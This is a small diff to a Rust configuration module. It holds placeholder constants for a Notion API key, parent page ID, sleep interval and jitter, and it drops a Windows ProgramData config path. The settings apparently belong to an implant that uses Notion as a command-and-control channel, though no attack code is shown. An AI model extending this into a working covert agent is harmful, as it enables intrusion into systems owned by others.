@@ -1,5 +1,3 @@
-extern crate serde;
-extern crate serde_json;
 use std::error::Error;
 use std::io::{self, Write};
 use std::fs;
@@ -8,20 +6,14 @@ use serde::{Deserialize, Serialize};
 use serde_json::{Value, to_string, to_value};
 use base64::encode;
 
+// Config consts
 pub const URL_BASE: &str = "https://api.notion.com/v1";
 pub const DEFAULT_API_KEY: &str = "<<API_KEY>>";
 pub const DEFAULT_PARENT_PAGE_ID: &str = "<<PARENT_PAGE_ID>>";
 pub const DEFAULT_SLEEP_INTERVAL: &str = "<<SLEEP>>";
 pub const DEFAULT_JITTER_TIME: &str = "<<JITTER>>";
 pub const DEFAULT_LOG_LEVEL: &str = "<<LOG_LEVEL>>";
-
-#[cfg(windows)]
-pub const CONFIG_FILE_PATH: &str = "C:\\ProgramData\\cfg.json";
-
-#[cfg(not(windows))]
 pub const CONFIG_FILE_PATH: &str = "./cfg.json";
-
-
 
 /// Storing Config Options as a struct for ergonomics.
 ///
